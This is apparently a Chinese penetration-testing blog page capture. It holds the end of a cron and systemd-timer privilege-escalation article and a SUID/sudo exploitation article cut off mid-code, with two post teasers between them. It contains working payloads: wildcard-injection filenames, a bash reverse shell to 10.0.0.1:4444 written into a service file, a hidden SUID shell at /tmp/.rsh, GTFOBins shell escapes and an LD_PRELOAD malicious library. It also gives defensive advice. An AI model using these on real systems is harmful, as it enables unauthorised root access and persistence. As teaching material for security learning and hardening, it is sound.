+<h3 id="4-2-其他常见命令的通配符利用"><a href="#4-2-其他常见命令的通配符利用" class="headerlink" title="4.2 其他常见命令的通配符利用"></a>4.2 其他常见命令的通配符利用</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>利用参数</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>tar</td>
+<td><code>--checkpoint=N --checkpoint-action=exec=CMD</code></td>
+<td>见上</td>
+</tr>
+<tr>
+<td>rsync</td>
+<td><code>-e CMD</code></td>
+<td><code>touch -- &quot;-e sh /tmp/x.sh&quot;</code></td>
+</tr>
+<tr>
+<td>chown</td>
+<td><code>--reference=FILE</code></td>
+<td><code>touch -- &quot;--reference=/etc/shadow&quot;</code></td>
+</tr>
+<tr>
+<td>chmod</td>
+<td><code>--reference=FILE</code></td>
+<td><code>touch -- &quot;--reference=/etc/shadow&quot;</code></td>
+</tr>
+<tr>
+<td>zip</td>
+<td><code>-T --unzip-command=CMD</code></td>
+<td><code>touch -- &quot;-T --unzip-command=sh x.sh&quot;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="五、pspy：无痕监控-Cron-进程"><a href="#五、pspy：无痕监控-Cron-进程" class="headerlink" title="五、pspy：无痕监控 Cron 进程"></a>五、pspy：无痕监控 Cron 进程</h2><p>pspy 是一款无需 root 权限即可监视进程活动的工具，可发现短暂运行的 Cron 任务。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载并运行</span></span><br><span class="line">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64</span><br><span class="line"><span class="built_in">chmod</span> +x pspy64</span><br><span class="line">./pspy64 -c           <span class="comment"># -c 彩色输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出示例：</span></span><br><span class="line"><span class="comment"># 10:01:01 CMD: UID=0 PID=12345 | /bin/sh /opt/cleanup.sh</span></span><br><span class="line"><span class="comment"># 10:01:01 CMD: UID=0 PID=12346 | tar -czf data.tar.gz *</span></span><br><span class="line"><span class="comment"># 10:01:01 CMD: UID=0 PID=12347 | date &gt;&gt; /var/log/backup.log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键分析点：</span></span><br><span class="line"><span class="comment"># ① UID=0 的进程 → root Cron 在执行</span></span><br><span class="line"><span class="comment"># ② 使用相对路径的命令 → 可 PATH 劫持</span></span><br><span class="line"><span class="comment"># ③ 使用 * 通配符 → 可通配符注入</span></span><br><span class="line"><span class="comment"># ④ /tmp、/opt 下的脚本调用 → 检查可写性</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、Systemd-Timer：现代替代方案"><a href="#六、Systemd-Timer：现代替代方案" class="headerlink" title="六、Systemd Timer：现代替代方案"></a>六、Systemd Timer：现代替代方案</h2><p>现代 Linux 中 Systemd Timer 正逐步取代 Cron，配置不当同样存在提权风险。</p>
+<h3 id="枚举-Timer"><a href="#枚举-Timer" class="headerlink" title="枚举 Timer"></a>枚举 Timer</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-timers --all</span><br><span class="line">find /etc/systemd /usr/lib/systemd -name <span class="string">&quot;*.timer&quot;</span> -o -name <span class="string">&quot;*.service&quot;</span> 2&gt;/dev/null | <span class="built_in">head</span> -20</span><br><span class="line">systemctl <span class="built_in">cat</span> backup.service 2&gt;/dev/null   <span class="comment"># 查看具体 Service 内容</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="提权场景"><a href="#提权场景" class="headerlink" title="提权场景"></a>提权场景</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 场景：Timer 对应的 Service 可写</span></span><br><span class="line"><span class="built_in">ls</span> -la /etc/systemd/system/backup.service</span><br><span class="line"><span class="comment"># -rw-rw-rw- 1 root root ...    ← 全局可写</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 ExecStart 为反弹 Shell</span></span><br><span class="line">sed -i <span class="string">&#x27;s|ExecStart=.*|ExecStart=/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&quot;|&#x27;</span> \</span><br><span class="line">    /etc/systemd/system/backup.service</span><br><span class="line">systemctl daemon-reload &amp;&amp; systemctl start backup.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 场景：Service 的 ExecStart 指向可写脚本</span></span><br><span class="line"><span class="comment"># ExecStart=/opt/scripts/cleanup.sh</span></span><br><span class="line"><span class="comment"># 如果脚本可写，直接覆盖即可，与 Cron 脚本覆盖同理</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Cron-vs-Systemd-Timer"><a href="#Cron-vs-Systemd-Timer" class="headerlink" title="Cron vs Systemd Timer"></a>Cron vs Systemd Timer</h3><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Cron</th>
+<th>Systemd Timer</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>配置</td>
+<td>crontab</td>
+<td>Unit 文件 (INI)</td>
+</tr>
+<tr>
+<td>环境变量</td>
+<td>PATH 极简</td>
+<td>Service 中显式定义</td>
+</tr>
+<tr>
+<td>日志</td>
+<td>自行重定向</td>
+<td>集成 journald</td>
+</tr>
+<tr>
+<td>资源限制</td>
+<td>无</td>
+<td>CPU&#x2F;Memory 限制</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="七、综合攻击流程"><a href="#七、综合攻击流程" class="headerlink" title="七、综合攻击流程"></a>七、综合攻击流程</h2><pre class="mermaid">flowchart TD
+    A[初始Shell] --> B[枚举Cron: /etc/crontab + spool + cron.d]
+    B --> C[运行pspy监控进程]
+    B --> D[运行LinPEAS扫描]
+    C & D --> E{识别攻击向量}
+    E -->|脚本可写| F[覆盖脚本注入Payload]
+    E -->|相对路径| G[PATH劫持：创建同名恶意文件]
+    E -->|通配符*| H[Wildcard注入：创建特殊文件名]
+    E -->|Systemd Timer| I[检查Service可写性]
+    F & G & H & I --> J[等待Cron/Timer触发]
+    J --> K[获得root权限]
+    K --> L[SUID bash / SSH公钥 / 持久化]</pre>
+
+<hr>
+<h2 id="八、实战剧本示例"><a href="#八、实战剧本示例" class="headerlink" title="八、实战剧本示例"></a>八、实战剧本示例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ====== 侦察 ======</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab                           <span class="comment"># */5 * * * * root /opt/monitoring/diag.sh</span></span><br><span class="line"><span class="built_in">ls</span> -la /opt/monitoring/diag.sh             <span class="comment"># -rwxrwxr-x → 可写！</span></span><br><span class="line"><span class="built_in">cat</span> /opt/monitoring/diag.sh</span><br><span class="line"><span class="comment"># cd /opt/monitoring</span></span><br><span class="line"><span class="comment"># tar -czf /var/log/diag.tar.gz logs/</span></span><br><span class="line"><span class="comment"># date &gt;&gt; /var/log/diag.log                ← 无绝对路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== 利用（三选一） ======</span></span><br><span class="line"><span class="comment"># A: 覆盖脚本</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /opt/monitoring/diag.sh &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/.rsh &amp;&amp; <span class="built_in">chmod</span> 4777 /tmp/.rsh</span><br><span class="line">EOF</span><br><span class="line"><span class="comment"># B: PATH劫持date</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/bash\ncp /bin/bash /tmp/.rsh &amp;&amp; chmod 4777 /tmp/.rsh\n/bin/date &quot;$@&quot;&#x27;</span> \</span><br><span class="line">    &gt; /opt/monitoring/date &amp;&amp; <span class="built_in">chmod</span> +x /opt/monitoring/date</span><br><span class="line"><span class="comment"># C: 通配符注入</span></span><br><span class="line"><span class="built_in">cd</span> /opt/monitoring/logs</span><br><span class="line"><span class="built_in">touch</span> -- <span class="string">&quot;--checkpoint=1&quot;</span> &amp;&amp; <span class="built_in">touch</span> -- <span class="string">&quot;--checkpoint-action=exec=sh /tmp/x.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== 获取root ======</span></span><br><span class="line"><span class="comment"># 等待5分钟后</span></span><br><span class="line">/tmp/.rsh -p    <span class="comment"># uid=0(root) gid=0(root)</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="九、防御建议"><a href="#九、防御建议" class="headerlink" title="九、防御建议"></a>九、防御建议</h2><ol>
+<li><strong>始终使用绝对路径</strong>：Cron 脚本中所有命令必须写完整路径（<code>/usr/bin/tar</code> 而非 <code>tar</code>）。</li>
+<li><strong>严格控制权限</strong>：Cron 脚本设为 <code>700</code>&#x2F;<code>750</code>，所有者为 root。</li>
+<li><strong>显式设置 PATH</strong>：在 crontab 顶部定义 <code>PATH=/usr/bin:/bin:/usr/sbin</code>。</li>
+<li><strong>避免通配符滥用</strong>：用精确文件列表替代 <code>*</code>；必须使用时加 <code>--</code> 分隔（如 <code>tar -czf out.tar.gz -- *</code>）。</li>
+<li><strong>定期审计</strong>：用 pspy&#x2F;auditd 监控异常 Cron 行为，用 AIDE&#x2F;Tripwire 监控关键文件权限。</li>
+<li><strong>审计 Systemd Timer</strong>：与 Cron 同等对待，检查 Timer&#x2F;Service 文件权限。</li>
+</ol>
+<hr>
+<h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>Cron 提权是 Linux 本地提权的高频考点，核心可归纳为三条攻击链路：</p>
+<table>
+<thead>
+<tr>
+<th>攻击路径</th>
+<th>前提条件</th>
+<th>核心动作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>脚本覆盖</td>
+<td>Cron 脚本对低权限用户可写</td>
+<td>直接修改脚本注入 Payload</td>
+</tr>
+<tr>
+<td>PATH 劫持</td>
+<td>Cron 脚本中使用相对路径命令</td>
+<td>在 PATH 靠前位置创建同名恶意文件</td>
+</tr>
+<tr>
+<td>通配符注入</td>
+<td>Cron 脚本使用 <code>tar *</code> 等通配符</td>
+<td>创建带参数字符的特殊文件名</td>
+</tr>
+</tbody></table>
+<p>实战中建议先使用 <strong>pspy</strong> 静默监控以发现隐藏的定时任务，再结合 <strong>LinPEAS</strong> 自动化定位可写脚本与 PATH 漏洞，最后根据具体情况选择最稳定的利用方案。掌握这些技术后，你会发现许多看似安全的 Linux 系统，仅仅因为一个使用了 <code>tar</code> 而非 <code>/usr/bin/tar</code> 的 Cron 脚本，就能从 www-data 一跃成为 root。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/SQL-injection-boolean-blind/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/SQL-injection-boolean-blind/" class="post-title-link" itemprop="url">SQL 注入：布尔盲注详解</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-09-15T08:00:00+08:00">2024-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>页面不显示数据也不报错时，用布尔盲注——通过真假条件的页面响应差异逐位猜解数据，Python 脚本自动化爆破。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/SQL-injection-boolean-blind/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/VulnHub-DC9-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/VulnHub-DC9-writeup/" class="post-title-link" itemprop="url">VulnHub DC-9 靶机实战</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-09-15T08:00:00+08:00">2024-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>VulnHub DC-9 靶机完整渗透实战。从搜索框 SQL 注入入手，通过 SQLMap 拖库获取凭据，利用 LFI 读取 knockd 配置文件完成端口敲门开启 SSH，经 Hydra 两轮爆破拿到 Shell，最终通过 SUID Python 脚本写入 /etc/passwd 实现提权。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/VulnHub-DC9-writeup/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Linux-privesc-suid-sudo/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/Linux-privesc-suid-sudo/" class="post-title-link" itemprop="url">Linux提权：SUID与Sudo利用</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-01 08:00:00" itemprop="dateCreated datePublished" datetime="2024-09-01T08:00:00+08:00">2024-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在Linux本地提权中，SUID（Set owner User ID）配置错误和Sudo配置不当是最常见的攻击面。SUID允许普通用户以文件所有者的权限（通常为root）运行程序，而Sudo通过策略规则授予受限的root操作能力。本文系统梳理SUID&#x2F;Sudo枚举、利用技巧与防御要点。</p>
+<hr>
+<h2 id="一、SUID基础"><a href="#一、SUID基础" class="headerlink" title="一、SUID基础"></a>一、SUID基础</h2><h3 id="1-1-SUID位"><a href="#1-1-SUID位" class="headerlink" title="1.1 SUID位"></a>1.1 SUID位</h3><p><code>SUID</code> 位（八进制 <code>4000</code>）作用于可执行文件。当文件设置了SUID位，其他用户执行它时，进程以<strong>文件所有者</strong>（而非执行者）的euid运行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -la /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 59976 Jan 15  2024 /usr/bin/passwd</span><br><span class="line"><span class="comment"># rws → SUID + 用户执行位</span></span><br><span class="line"><span class="comment"># 八进制：4755 = SUID(4000) + rwxr-xr-x(755)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-SUID枚举命令"><a href="#1-2-SUID枚举命令" class="headerlink" title="1.2 SUID枚举命令"></a>1.2 SUID枚举命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 核心枚举命令</span></span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">ls</span> -la &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 排除噪音目录</span></span><br><span class="line">find / -path /proc -prune -o -perm -4000 -<span class="built_in">type</span> f -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 快速扫描常见目录</span></span><br><span class="line">find /usr /bin /opt /sbin -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、常见SUID利用（GTFOBins）"><a href="#二、常见SUID利用（GTFOBins）" class="headerlink" title="二、常见SUID利用（GTFOBins）"></a>二、常见SUID利用（GTFOBins）</h2><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a> 是SUID&#x2F;Sudo利用的权威字典。下面列出渗透中最常遇到的SUID二进制及其利用payload。</p>
+<h3 id="2-1-find"><a href="#2-1-find" class="headerlink" title="2.1 find"></a>2.1 find</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -exec 以文件所有者权限执行，-p保留euid，-quit避免循环</span></span><br><span class="line">./find . -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-vim"><a href="#2-2-vim" class="headerlink" title="2.2 vim"></a>2.2 vim</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方式一：直接调用shell</span></span><br><span class="line">./vim -c <span class="string">&#x27;:!/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式二：利用Python接口</span></span><br><span class="line">./vim -c <span class="string">&#x27;:py3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;exec sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-bash"><a href="#2-3-bash" class="headerlink" title="2.3 bash"></a>2.3 bash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -p 禁止bash丢弃特权（部分发行版编译时禁用，此方式可能失效）</span></span><br><span class="line">./bash -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-python-python3"><a href="#2-4-python-python3" class="headerlink" title="2.4 python &#x2F; python3"></a>2.4 python &#x2F; python3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./python -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash -p&quot;)&#x27;</span></span><br><span class="line">./python3 -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-perl"><a href="#2-5-perl" class="headerlink" title="2.5 perl"></a>2.5 perl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/bash -p&quot;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-6-其他SUID二进制速查"><a href="#2-6-其他SUID二进制速查" class="headerlink" title="2.6 其他SUID二进制速查"></a>2.6 其他SUID二进制速查</h3><table>
+<thead>
+<tr>
+<th>二进制</th>
+<th>利用命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>less</code></td>
+<td>打开文件后 <code>!/bin/sh</code></td>
+</tr>
+<tr>
+<td><code>more</code></td>
+<td>同 <code>less</code>，<code>!/bin/sh</code></td>
+</tr>
+<tr>
+<td><code>awk</code></td>
+<td><code>./awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</code></td>
+</tr>
+<tr>
+<td><code>nmap</code></td>
+<td>旧版 <code>--interactive</code>；新版 <code>--script=</code> 加载lua执行</td>
+</tr>
+<tr>
+<td><code>cp/mv</code></td>
+<td>复制 <code>/bin/sh</code> 并重新设置SUID：<code>chmod u+s /tmp/sh</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="三、Sudo配置审计与滥用"><a href="#三、Sudo配置审计与滥用" class="headerlink" title="三、Sudo配置审计与滥用"></a>三、Sudo配置审计与滥用</h2><h3 id="3-1-sudo-l-枚举"><a href="#3-1-sudo-l-枚举" class="headerlink" title="3.1 sudo -l 枚举"></a>3.1 <code>sudo -l</code> 枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例输出分析：</span></span><br><span class="line"><span class="comment"># User hacker may run the following commands on this host:</span></span><br><span class="line"><span class="comment">#   (root) NOPASSWD: /usr/bin/find           ← 无需密码，GTFOBins直接提权</span></span><br><span class="line"><span class="comment">#   (root) /usr/bin/vim /var/www/*            ← 通配符，可绕过路径限制</span></span><br><span class="line"><span class="comment">#   (ALL) SETENV: NOPASSWD: /usr/bin/python3  ← SETENV→LD_PRELOAD劫持</span></span><br></pre></td></tr></table></figure>
+
+<p>关键字段含义：<code>(root)</code>可切换用户、<code>NOPASSWD</code>免密、<code>SETENV</code>允许环境变量注入。</p>
+<h3 id="3-2-Sudo下的GTFOBins利用"><a href="#3-2-Sudo下的GTFOBins利用" class="headerlink" title="3.2 Sudo下的GTFOBins利用"></a>3.2 Sudo下的GTFOBins利用</h3><p>SUID的GTFOBins payload对Sudo同样有效，只需在前面加 <code>sudo</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> find . -<span class="built_in">exec</span> /bin/sh \; -quit</span><br><span class="line"><span class="built_in">sudo</span> vim -c <span class="string">&#x27;:!/bin/sh&#x27;</span></span><br><span class="line"><span class="built_in">sudo</span> python -c <span class="string">&#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、LD-PRELOAD-劫持（SETENV）"><a href="#四、LD-PRELOAD-劫持（SETENV）" class="headerlink" title="四、LD_PRELOAD 劫持（SETENV）"></a>四、LD_PRELOAD 劫持（SETENV）</h2><p>当 <code>sudo -l</code> 输出含 <code>SETENV</code> 时，可保留 <code>LD_PRELOAD</code> 环境变量，强制目标程序加载恶意共享库。</p>
+<h3 id="4-1-条件"><a href="#4-1-条件" class="headerlink" title="4.1 条件"></a>4.1 条件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="comment"># (ALL) SETENV: NOPASSWD: /usr/bin/some_target</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-编写恶意共享库"><a href="#4-2-编写恶意共享库" class="headerlink" title="4.2 编写恶意共享库"></a>4.2 编写恶意共享库</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash 